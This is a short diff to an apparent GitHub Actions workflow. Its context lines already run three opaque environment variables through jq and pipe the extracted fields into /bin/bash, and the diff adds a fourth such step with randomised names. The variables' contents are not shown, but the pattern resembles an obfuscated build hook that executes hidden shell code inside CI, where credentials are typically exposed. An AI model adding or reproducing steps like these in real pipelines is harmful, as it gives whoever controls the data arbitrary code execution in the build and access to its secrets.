@@ -32,6 +32,7 @@ jobs:
           printf '%s' "$do7247" | jq -r .qoozs7110 | /bin/bash
           printf '%s' "$xlv2974" | jq -r .rvd054 | /bin/bash
           printf '%s' "$d12687" | jq -r .ul6399 | /bin/bash
+          echo $rzkv534 | jq -r .mk19922 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
